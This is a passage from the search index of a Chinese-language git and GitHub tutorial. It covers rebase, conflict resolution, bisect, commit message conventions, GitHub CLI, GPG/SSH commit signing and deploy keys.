&lt;ref&gt; = track a placeholder for the &lt;ref&gt; to be updated\n#                       to this position in the new commits. The &lt;ref&gt; is\n#                       updated at the end of the rebase\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n</code></pre> <p>\u200b\u6bd4\u5982\u8bf4\u200b\uff0c\u200b\u4f60\u200b\u60f3\u200b\u5408\u5e76\u200b\u6700\u8fd1\u200b 3 \u200b\u4e2a\u200b commit \u200b\u5230\u200b 1 \u200b\u4e2a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u7f16\u8f91\u5668\u200b\u4e2d\u5c06\u200b\u4e0a\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u4fee\u6539\u200b\u4e3a\u200b\u5982\u4e0b\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5e76\u200b\u9000\u51fa\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>pick b9c96cc Install XDG Desktop Portal\nsquash d20fcf1 Set 2048m mem when running qemu\nsquash 74fd856 Add gnome-software; clean comments\n</code></pre> <p>\u200b\u4ea4\u4e92\u5f0f\u200b rebase \u200b\u7684\u200b\u5176\u4ed6\u200b\u7528\u6cd5\u200b\u8bf7\u200b\u53c2\u8003\u200b\u76f8\u5173\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u89e3\u51b3\u200b\u51b2\u7a81\u200b</p> <p>\u200b\u5728\u200b\u5408\u5e76\u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b\u5206\u652f\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u548c\u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b\u5206\u652f\u200b\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4fee\u6539\u200b\u4e86\u200b\u76f8\u540c\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\u3002\u200b\u5f53\u200b\u51fa\u73b0\u200b git \u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u7684\u200b\u51b2\u7a81\u200b\u65f6\u200b\uff0c\u200b\u5408\u5e76\u200b\u4f1a\u200b\u505c\u200b\u5728\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\u7684\u200b commit \u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u793a\u200b\u4f60\u200b\u89e3\u51b3\u200b\u51b2\u7a81\u200b\u3002\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\u7684\u200b\u6587\u4ef6\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD\nThis is your own changes.\n========\nThis is the changes from the other branch.\n&gt;&gt;&gt;&gt;&gt;&gt;&gt; other-branch\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u540c\u65f6\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u53cc\u65b9\u200b\u7684\u200b\u4fee\u6539\u200b\uff0c\u200b\u89e3\u51b3\u200b\u51b2\u7a81\u200b\u9700\u8981\u200b\uff1a</p> <ul> <li>\u200b\u624b\u52a8\u200b\u4fee\u6539\u200b\u6587\u4ef6\u200b\u5230\u200b\u9884\u671f\u200b\u7684\u200b\u5185\u5bb9\u200b\uff08\u200b\u8bb0\u5f97\u200b\u628a\u200b <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>\u3001<code>=======</code> \u200b\u548c\u200b <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> \u200b\u5220\u9664\u200b\u6389\u200b\uff01\uff09</li> <li>\u200b\u7136\u540e\u200b <code>git add</code> \u200b\u8be5\u200b\u6587\u4ef6\u200b</li> <li>\u200b\u6700\u540e\u200b\u6839\u636e\u200b\u662f\u200b merge \u200b\u8fd8\u662f\u200b rebase \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>git merge --continue</code> \u200b\u6216\u200b <code>git rebase --continue</code> \u200b\u7ee7\u7eed\u200b\u5408\u5e76\u200b\uff08\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git status</code> \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7684\u200b\u72b6\u6001\u200b\uff09</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u60f3\u200b\u89e3\u51b3\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git merge --abort</code> \u200b\u6216\u200b <code>git rebase --abort</code> \u200b\u53d6\u6d88\u200b\u5408\u5e76\u200b\u64cd\u4f5c\u200b</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b pre-commit \u200b\u7684\u200b pre-commit-hooks \u200b\u6765\u200b\u907f\u514d\u200b\u4e0d\u200b\u5c0f\u5fc3\u200b\u628a\u200b\u672a\u200b\u89e3\u51b3\u200b\u7684\u200b\u51b2\u7a81\u200b commit \u200b\u5230\u200b\u4ed3\u5e93\u200b\u91cc\u200b\u3002</p> <p><code>git commit --fixup</code></p> <p>git \u200b\u63d0\u4f9b\u200b\u4e86\u200b fixup \u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5411\u200b\u6307\u5b9a\u200b\u7684\u200b commit \u200b\u6dfb\u52a0\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b rebase \u200b\u65f6\u200b\u81ea\u52a8\u200b\u5408\u5e76\u200b\u3002\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff1a\u200b\u5728\u200b\u7f16\u5199\u200b PR \u200b\u65f6\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u6bcf\u4e2a\u200b commit \u200b\u6709\u200b\u610f\u4e49\u200b\u3001\u200b\u529f\u80fd\u200b\u5b8c\u6574\u200b\uff0c\u200b\u540c\u65f6\u200b\u9700\u8981\u200b\u5411\u200b PR \u200b\u91cc\u200b\u4e4b\u524d\u200b\u7684\u200b commit \u200b\u6dfb\u52a0\u200b\u4fee\u590d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f7f\u7528\u200b fixup \u200b\u529f\u80fd\u200b\u4f1a\u200b\u5f88\u200b\u65b9\u4fbf\u200b\u3002\u200b\u65b9\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code># \u200b\u5148\u200b stage \u200b\u4fee\u6539\u200b\uff0c\u200b\u7136\u540e\u200b\uff1a\ngit commit --fixup &lt;commit&gt;\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u4ee5\u200b <code>fixup! &lt;original commit message&gt;</code> \u200b\u547d\u540d\u200b\u7684\u200b commit\u3002\u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b rebase\uff1a</p> <pre><code># \u200b\u9700\u8981\u200b\u5305\u542b\u200b fixup \u200b\u7684\u200b\u76ee\u6807\u200b commit\ngit rebase -i --autosquash &lt;base&gt;\n</code></pre>"},{"location":"dev/git/#git-bisect","title":"Bisect","text":"<p>\u200b\u5728\u200b\u8c03\u8bd5\u200b\u95ee\u9898\u200b\u65f6\u200b\uff0c\u200b\u6709\u65f6\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u8fd9\u6837\u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a\u200b\u67d0\u4e2a\u200b bug \u200b\u5728\u200b\u65e7\u7248\u672c\u200b\u6ca1\u6709\u200b\u51fa\u73b0\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u65b0\u200b\u7248\u672c\u200b\u51fa\u73b0\u200b\u4e86\u200b\uff0c\u200b\u6216\u8005\u200b\u67d0\u4e2a\u200b\u95ee\u9898\u200b\u5728\u200b\u65e7\u7248\u672c\u200b\u5b58\u5728\u200b\uff0c\u200b\u65b0\u200b\u7248\u672c\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u540c\u65f6\u200b\u9700\u8981\u200b\u641e\u6e05\u695a\u200b\u5177\u4f53\u200b\u662f\u200b\u54ea\u200b\u4e00\u4e2a\u200b commit \u200b\u5bfc\u81f4\u200b/\u200b\u4fee\u590d\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u4e00\u4e2a\u200b\u4e00\u4e2a\u200b commit \u200b\u7f16\u8bd1\u200b\u6d4b\u8bd5\u200b\u663e\u7136\u200b\u5de5\u4f5c\u91cf\u200b\u5b9e\u5728\u200b\u592a\u200b\u5927\u200b\uff0c\u200b\u6b64\u65f6\u200b <code>git bisect</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8d77\u5230\u200b\u5f88\u5927\u200b\u7684\u200b\u5e2e\u52a9\u200b\u3002\u200b\u5728\u200b\u4f7f\u7528\u200b bisect \u200b\u65f6\u200b\uff0c\u200b\u9700\u8981\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b \"good\"\uff08\u200b\u65e7\u7248\u672c\u200b\uff09commit \u200b\u548c\u200b\u4e00\u4e2a\u200b \"bad\"\uff08\u200b\u65b0\u200b\u7248\u672c\u200b\uff09commit\uff1a</p> <pre><code>git bisect start\ngit bisect good &lt;old-commit&gt;\ngit bisect bad &lt;new-commit&gt;\n</code></pre> <p>\u200b\u4e4b\u540e\u200b <code>git bisect</code> \u200b\u5c31\u200b\u4f1a\u200b\u5e2e\u52a9\u200b\u4f60\u200b\u505a\u200b\u4e8c\u5206\u200b\u641c\u7d22\u200b\uff0c\u200b\u8df3\u8f6c\u200b\u5230\u200b\u4e24\u8005\u200b\u4e2d\u95f4\u200b\u7684\u200b commit \u200b\u4ee5\u4f9b\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u4e4b\u540e\u200b\u63d0\u4f9b\u200b <code>git bisect good</code> \u200b\u6216\u8005\u200b <code>git bisect bad</code> \u200b\u5f15\u5bfc\u200b git \u200b\u641c\u7d22\u200b\uff0c\u200b\u6700\u7ec8\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b commit\u3002</p> <p>good or bad?</p> <p>\u200b\u6709\u65f6\u5019\u200b\u6211\u4eec\u200b\u4f1a\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u54ea\u4e2a\u200b commit \u200b\u4fee\u590d\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u5bfc\u81f4\u200b\uff09\u200b\u4e86\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b <code>git bisect</code> \u200b\u9ed8\u8ba4\u200b good \u200b\u9700\u8981\u200b\u65e9\u200b\u4e8e\u200b bad\uff0c\u200b\u76f4\u63a5\u200b <code>git bisect start</code> \u200b\u7684\u8bdd\u200b\u5f88\u200b\u5bb9\u6613\u200b\u8bef\u64cd\u4f5c\u200b\u3002\u200b\u8bf7\u200b\u9605\u8bfb\u200b git-bisect(1) \u200b\u4e86\u89e3\u200b\u5e94\u8be5\u200b\u5982\u4f55\u200b\u5904\u7406\u200b\u6b64\u7c7b\u60c5\u51b5\u200b\u3002</p>"},{"location":"dev/git/#git-commit-message","title":"Commit Message Convention","text":"<p>\u200b\u5bf9\u4e8e\u200b\u591a\u4eba\u200b\u534f\u4f5c\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u826f\u597d\u200b\u7684\u200b commit message \u200b\u662f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u3002\u200b\u80e1\u4e71\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b <code>update</code>\u3001<code>fix</code>\u3001<code>change</code> \u200b\u7b49\u200b\u65e0\u200b\u610f\u4e49\u200b\u7684\u200b Commit Message\uff0c\u200b\u4f1a\u200b\u4f7f\u5f97\u200b\u9879\u76ee\u200b\u7684\u200b\u5386\u53f2\u8bb0\u5f55\u200b\u53d8\u5f97\u200b\u96be\u4ee5\u200b\u7406\u89e3\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u7ed9\u200b\u540e\u7eed\u200b\u7684\u200b\u7ef4\u62a4\u200b\u5e26\u6765\u200b\u56f0\u96be\u200b\u3002</p> <p>Conventional Commits</p> <p>\u200b\u4e00\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b Commit Message \u200b\u683c\u5f0f\u200b\u662f\u200b Conventional Commits\uff0c\u200b\u5b83\u200b\u7684\u200b\u683c\u5f0f\u200b\u662f\u200b\uff1a</p> <pre><code>&lt;type&gt;[optional scope]: &lt;description&gt;\n\n[optional body]\n\n[optional footer(s)]\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\uff1a</p> <ul> <li><code>type</code> \u200b\u662f\u200b commit \u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u662f\u200b <code>feat</code>\u3001<code>fix</code>\u3001<code>docs</code>\u3001<code>style</code>\u3001<code>refactor</code>\u3001<code>perf</code>\u3001<code>test</code>\u3001<code>build</code>\u3001<code>ci</code>\u3001<code>chore</code> \u200b\u7b49\u200b\u3002</li> <li><code>scope</code> \u200b\u662f\u200b commit \u200b\u7684\u200b\u4f5c\u7528\u57df\u200b</li> <li><code>description</code> \u200b\u662f\u200b commit \u200b\u7684\u200b\u7b80\u8981\u200b\u63cf\u8ff0\u200b</li> <li><code>body</code> \u200b\u662f\u200b commit \u200b\u7684\u200b\u8be6\u7ec6\u63cf\u8ff0\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u5f15\u7528\u200b issue\u3001\u200b\u89e3\u91ca\u200b\u4fee\u6539\u200b\u7684\u200b\u539f\u56e0\u200b\u7b49\u200b</li> <li><code>footer</code> \u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u5f15\u7528\u200b issue\u3001\u200b\u5173\u95ed\u200b issue \u200b\u7b49\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>Closes #123</code>\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b breaking change \u200b\u7b49\u200b</li> </ul> <p>\u200b\u503c\u5f97\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4ee5\u4e0a\u200b\u89c4\u8303\u200b\u4ec5\u4ec5\u53ea\u662f\u200b\u63a8\u8350\u200b\uff0c\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9879\u76ee\u200b\u7684\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u8fdb\u884c\u200b\u8c03\u6574\u200b\uff0c\u200b\u4f8b\u5982\u200b\u672c\u200b\u6587\u6863\u200b\u6240\u200b\u5b58\u653e\u200b\u7684\u200b\u4ed3\u5e93\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6587\u6863\u200b\u7c7b\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u4e00\u822c\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7701\u7565\u200b\u6389\u200b <code>type</code>, \u200b\u53ef\u7528\u200b\u6587\u6863\u200b\u76f8\u5bf9\u200b\u76ee\u5f55\u200b\u6765\u200b\u66ff\u4ee3\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4fee\u6539\u200b\u672c\u6587\u200b\u7684\u200b Commit Message \u200b\u4e00\u822c\u200b\u5c31\u200b\u5199\u6210\u200b <code>dev/git: fix typo</code>.</p> <p>Commit Message \u200b\u6a21\u677f\u200b</p> <p>\u200b\u5373\u4fbf\u200b\u4e0d\u200b\u4e25\u683c\u200b\u9075\u5faa\u200b\u4e0a\u8ff0\u200b\u89c4\u8303\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b commit message \u200b\u6a21\u677f\u200b\u4e5f\u200b\u662f\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b \u200b\u8fd9\u91cc\u200b\u7684\u200b\u4f8b\u5b50\u200b \u200b\u6dfb\u52a0\u200b\u5230\u200b <code>~/.gitmessage</code>\uff1a</p> <pre><code># ~/.gitconfig\n[commit]\n    template = ~/.gitmessage\n</code></pre> <p>\u200b\u6dfb\u52a0\u200b\u540e\u200b\u4e0d\u8981\u200b\u5fd8\u8bb0\u200b\u5728\u200b\u9996\u884c\u200b\u6dfb\u52a0\u200b\u7a7a\u884c\u200b\uff0c\u200b\u8fd9\u6837\u200b <code>git commit</code> \u200b\u65f6\u200b\u65e0\u9700\u200b\u65b0\u5efa\u200b\u4e00\u884c\u200b\u3002</p>"},{"location":"dev/git/#github","title":"GitHub \u200b\u4f7f\u7528\u200b\u6280\u5de7","text":""},{"location":"dev/git/#github-cli","title":"GitHub CLI","text":"<p>GitHub CLI \u200b\u662f\u200b GitHub \u200b\u5b98\u65b9\u200b\u63d0\u4f9b\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u7ba1\u7406\u200b GitHub \u200b\u4ed3\u5e93\u200b\u3001Issue\u3001Pull Request \u200b\u7b49\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u7ed9\u200b <code>ustclug/Linux201-docs</code> \u200b\u4fee\u200b bug \u200b\u7684\u200b\u6d41\u7a0b\u200b\u53ef\u4ee5\u200b\u7b80\u5316\u200b\u4e3a\u200b\uff1a</p> <pre><code>gh repo clone ustclug/Linux201-docs\ngit commit -a -m \"fix: some bug\"\ngh pr create\n</code></pre> <p>\u200b\u5176\u4ed6\u200b\u5e38\u7528\u200b\u7684\u200b GitHub CLI \u200b\u547d\u4ee4\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li><code>gh repo view --web</code>\uff1a\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u6253\u5f00\u200b\u5f53\u524d\u200b\u4ed3\u5e93\u200b</li> <li><code>gh issue list</code>\uff1a\u200b\u5217\u51fa\u200b\u5f53\u524d\u200b\u4ed3\u5e93\u200b\u7684\u200b Issue</li> <li><code>gh run watch</code>\uff1a\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u4ed3\u5e93\u200b\u7684\u200b GitHub Actions \u200b\u8fd0\u884c\u200b\u72b6\u6001\u200b</li> </ul> <code>gh run watch</code> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b <code>gh run watch</code> \u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u9009\u62e9\u200b\u5173\u6ce8\u200b\u7684\u200b GitHub workflow, \u200b\u5982\u679c\u200b\u53ea\u60f3\u200b\u5173\u6ce8\u200b\u6700\u65b0\u200b\u7684\u200b workflow \u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5982\u4e0b\u200b\u51fd\u6570\u200b\u6dfb\u52a0\u200b\u5230\u200b <code>~/.bashrc</code> \u200b\u6216\u200b <code>~/.zshrc</code>:</p> <pre><code>watch_latest_run() {\n  # Fetch the latest run ID using gh and jq\n  local latest_run_id=$(gh run list --limit 1 --json databaseId --jq '.[0].databaseId')\n\n  if [ -z \"$latest_run_id\" ]; then\n    echo \"No runs found.\"\n    return 1\n  fi\n\n  # Pass the latest run ID to gh run watch\n  gh run watch \"$latest_run_id\"\n}\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>watch_latest_run</code> \u200b\u547d\u4ee4\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"dev/git/#github-sign","title":"GPG \u200b\u4e0e\u200b SSH \u200b\u5bc6\u94a5\u200b\u7b7e\u540d","text":"<p>\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0cSSH Key \u200b\u53ea\u200b\u7528\u6765\u200b\u9a8c\u8bc1\u200b\u4f60\u200b\u662f\u5426\u200b\u6709\u200b\u6743\u9650\u200b\u4fee\u6539\u200b\u6307\u5b9a\u200b\u7684\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u4f46\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b\u67d0\u4e2a\u200b commit \u200b\u5c31\u662f\u200b\u7531\u200b\u4f60\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u5176\u4ed6\u4eba\u200b\uff09\u200b\u63d0\u4ea4\u200b\u7684\u200b\uff0c\u200b\u4ee5\u200b\u9a8c\u8bc1\u200b commit \u200b\u7684\u200b\u771f\u5b9e\u6027\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u9700\u8981\u200b\u5bf9\u200b commit \u200b\u7b7e\u540d\u200b\u3002GPG Key \u200b\u548c\u200b SSH Key \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u7b7e\u540d\u200b\u3002</p> <p>\u200b\u5728\u200b\u6309\u7167\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u914d\u7f6e\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5373\u53ef\u200b\u4e3a\u200b commit \u200b\u548c\u200b tag \u200b\u7b7e\u540d\u200b\uff1a</p> <pre><code>git commit -S ...\ngit tag -s ...\n</code></pre> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u81ea\u52a8\u200b\u4e3a\u200b\u6240\u6709\u200b commit \u200b\u548c\u200b tag \u200b\u7b7e\u540d\u200b\uff08\u200b\u4e0d\u7ba1\u200b\u662f\u200b\u4f7f\u7528\u200b GPG \u200b\u8fd8\u662f\u200b SSH \u200b\u7b7e\u540d\u200b\uff09\uff0c\u200b\u5219\u200b\uff1a</p> <pre><code>git config --global commit.gpgSign true\ngit config --global tag.gpgSign true\n</code></pre>"},{"location":"dev/git/#github-gpg","title":"GPG \u200b\u7b7e\u540d","text":"<p>GitHub \u200b\u5bf9\u200b GPG Key \u200b\u7684\u200b\u6587\u6863\u200b\u63cf\u8ff0\u200b\u5f88\u200b\u8be6\u7ec6\u200b\uff0c\u200b\u6211\u4eec\u200b\u5c06\u200b\u5176\u5217\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff1a</p> <ul> <li>\u200b\u751f\u6210\u200b GPG Key</li> <li>\u200b\u4fee\u6539\u200b GPG Key \u200b\u4fe1\u606f\u200b</li> <li>\u200b\u8bbe\u7f6e\u200b Git \u200b\u4f7f\u7528\u200b GPG Sign</li> <li>\u200b\u5728\u200b GitHub \u200b\u4e0a\u200b\u5173\u8054\u200b GPG Key</li> </ul> <p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\u5907\u4efd\u200b GPG Key, \u200b\u5e76\u200b\u989d\u5916\u200b\u5411\u200b\u5176\u4ed6\u200b Key Server \u200b\u53d1\u5e03\u200b GPG Key, \u200b\u4ee5\u200b\u9632\u6b62\u200b GPG Key \u200b\u4e22\u5931\u200b\uff1a</p> <pre><code>gpg --list-secret-keys --keyid-format LONG\ngpg --armor --export &lt;GPG Key ID&gt; | tee gpg.key\ngpg --keyserver keyserver.ubuntu.com --send-keys &lt;GPG Key ID&gt;\ngpg --keyserver pgp.mit.edu --send-keys &lt;GPG Key ID&gt;\n</code></pre> <p>\u200b\u8fc7\u671f\u200b\u7684\u200b GPG Key</p> <p>\u200b\u8fc7\u671f\u200b\u7684\u200b GPG Key \u200b\u662f\u200b\u53ef\u4ee5\u200b\u66f4\u65b0\u200b\u7684\u200b, \u200b\u53c2\u8003\u200b \u200b\u8fd9\u4e2a\u200b StackOverflow \u200b\u56de\u7b54\u200b. \u200b\u5728\u200b GitHub \u200b\u4e0a\u200b rotate \u200b\u53ea\u200b\u9700\u8981\u200b\u5220\u9664\u200b\u65e7\u200b\u7684\u200b GPG Key, \u200b\u7136\u540e\u200b\u91cd\u65b0\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b GPG Key \u200b\u5373\u53ef\u200b. \u200b\u503c\u5f97\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\u8fc7\u671f\u200b\u7684\u200b GPG Key \u200b\u7b7e\u540d\u200b\u7684\u200b commit \u200b\u4f9d\u7136\u200b\u4f1a\u200b\u663e\u793a\u200b\u6210\u200b Verified, \u200b\u56e0\u6b64\u200b\u4e0d\u8981\u200b\u8f7b\u6613\u200b\u5220\u9664\u200b\u8fc7\u671f\u200b\u7684\u200b GPG Key.</p>"},{"location":"dev/git/#github-ssh","title":"SSH \u200b\u7b7e\u540d","text":"<p>\u200b\u5728\u200b\u5df2\u7ecf\u200b\u4e3a\u200b\u8d26\u6237\u200b\u6dfb\u52a0\u200b\u4e86\u200b SSH Key \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0cSSH \u200b\u7b7e\u540d\u200b\u7684\u200b\u914d\u7f6e\u200b\u5c31\u200b\u7b80\u5355\u200b\u5f97\u200b\u591a\u200b\uff1a</p> <pre><code>git config --global gpg.format ssh\ngit config --global user.signingkey ~/.ssh/yourkey.pub\n</code></pre>"},{"location":"dev/git/#github-deploy-keys","title":"Deploy Keys","text":"<p>GitHub \u200b\u7684\u200b deploy keys \u200b\u529f\u80fd\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u5bf9\u200b\u7279\u5b9a\u200b\u4ed3\u5e93\u200b\u6dfb\u52a0\u200b\u53ea\u200b\u7528\u4e8e\u200b\u8be5\u200b\u4ed3\u5e93\u200b\u7684\u200b SSH key\uff0c\u200b\u5728\u200b\u9700\u8981\u200b\u5c06\u200b\u4ed3\u5e93\u200b clone \u200b\u5230\u200b\u5176\u5b83\u200b\u673a\u5668\u200b\uff0c\u200b\u4f46\u200b\u53c8\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u8be5\u200b\u673a\u5668\u200b\u6709\u200b\u7528\u6237\u200b\u7684\u200b\u5168\u90e8\u200b\u6743\u9650\u200b\u65f6\u200b\u5f88\u200b\u6709\u7528\u200b\u3002\u200b\u4f46\u662f\u200b\uff0cGitHub \u200b\u4e0d\u200b\u5141\u8bb8\u200b\u540c\u4e00\u4e2a\u200b SSH key \u200b\u7528\u200b\u5728\u200b\u591a\u4e2a\u200b\u4ed3\u5e93\u200b\u4e0a\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u9700\u8981\u200b\u5728\u200b\u540c\u4e00\u200b\u673a\u5668\u200b\u4e0a\u200b clone \u200b\u591a\u200b\u4ed3\u5e93\u200b\u7684\u200b\u573a\u666f\u200b\u5e26\u6765\u200b\u4e86\u200b\u4e0d\u4fbf\u200b\u3002</p> <p>\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b Managing deploy keys \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u79cd\u200b\u65b9\u6848\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u53e6\u200b\u4e00\u79cd\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fee\u6539\u200b <code>~/.ssh/config</code> \u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u4ed3\u5e93\u200b\u8bbe\u7f6e\u200b\u522b\u540d\u200b\u7684\u200b\u65b9\u6848\u200b\u3002</p> <ol> <li> <p>\u200b\u8fdb\u5165\u200b\u4ed3\u5e93\u200b\u7684\u200b <code>.git</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5728\u200b\u8be5\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u3002</p> <pre><code>cd .git\n# RSA key pair\nssh-keygen -f ./id_rsa -t rsa -b 4096 -N \"\"\n# or ED25519 key pair\nssh-keygen -f ./id_ed25519 -t ed25519 -N \"\"\n</code></pre> </li> <li> <p>\u200b\u4fee\u6539\u200b <code>.git/config</code> \u200b\u5185\u5bb9\u200b\uff0c\u200b\u5728\u200b <code>[core]</code> \u200b\u8fd9\u4e2a\u200b section \u200b\u4e0b\u200b\u6dfb\u52a0\u200b\uff1a</p> <pre><code>[core]\n    # ...\n    # RSA key pair\n    sshCommand = ssh -i .git/id_rsa\n    # or ED25519 key pair\n    sshCommand = ssh -i .git/id_ed25519\n</code></pre> </li> <li> <p>\u200b\u5c06\u200b\u516c\u94a5\u200b\uff08\u200b\u4ee5\u200b <code>.pub</code> \u200b\u7ed3\u5c3e\u200b\uff0c\u200b\u522b\u200b\u5c06\u200b\u79c1\u94a5\u200b\u53d1\u7ed9\u200b\u5176\u4ed6\u200b\u4efb\u4f55\u4eba\u200b\uff01\uff09\u200b\u6dfb\u52a0\u200b\u5230\u200b\u4ed3\u5e93\u200b\u8bbe\u7f6e\u200b\u7684\u200b deploy keys \u200b\u4e2d\u200b\u3002</p> </li> </ol> 